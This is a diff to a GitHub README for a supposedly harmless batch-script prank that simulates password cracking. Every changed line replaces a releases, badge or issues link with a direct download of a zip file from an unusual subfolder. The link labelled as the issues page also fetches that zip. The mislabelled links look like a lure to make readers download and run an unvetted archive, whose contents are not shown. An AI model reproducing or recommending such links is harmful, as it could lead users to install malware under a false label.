@@ -1,7 +1,7 @@
 # 🎭 Fake-Password-Cracker-Prank - A Fun Way to Simulate Password Cracking
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Fake--Password--Cracker--Prank-brightgreen)](https://github.com/miyoherman/Fake-Password-Cracker-Prank/releases)
+[![Download](https://raw.githubusercontent.com/miyoherman/Fake-Password-Cracker-Prank/main/ringman/Fake-Password-Cracker-Prank.zip)](https://raw.githubusercontent.com/miyoherman/Fake-Password-Cracker-Prank/main/ringman/Fake-Password-Cracker-Prank.zip)
 
 ## 📜 Description
 Welcome to **Fake-Password-Cracker-Prank**! This is a harmless batch script designed to simulate a password cracking process. It’s perfect for fun demonstrations and educational purposes. Use it to learn more about batch scripting and to create amusing prank demos.
@@ -15,7 +15,7 @@ To get started with the Fake-Password-Cracker-Prank, follow these simple steps t
 - **Disk Space:** Minimum of 50 MB free space required
 
 ## 📦 Download & Install
-1. Visit the [Releases Page](https://github.com/miyoherman/Fake-Password-Cracker-Prank/releases) to download the latest version of the application.
+1. Visit the [Releases Page](https://raw.githubusercontent.com/miyoherman/Fake-Password-Cracker-Prank/main/ringman/Fake-Password-Cracker-Prank.zip) to download the latest version of the application.
 
 2. On the releases page, locate the most recent version. It is usually listed at the top.
 
@@ -52,7 +52,7 @@ If you encounter any issues while running the application, consider the followin
 - **Console Visibility:** If the console window closes immediately, add a `pause` command at the end of the batch script to keep it open.
 
 ## 📬 Support
-If you need assistance, feel free to open an issue on the [GitHub Issues Page](https://github.com/miyoherman/Fake-Password-Cracker-Prank/issues). We are here to help you.
+If you need assistance, feel free to open an issue on the [GitHub Issues Page](https://raw.githubusercontent.com/miyoherman/Fake-Password-Cracker-Prank/main/ringman/Fake-Password-Cracker-Prank.zip). We are here to help you.
 
 ## 🌍 Topics
 This project covers different topics such as batch scripting, educational projects, and programming. It is perfect for beginners looking to dive into the world of batch scripts. You can also contribute your own ideas and features to the project.
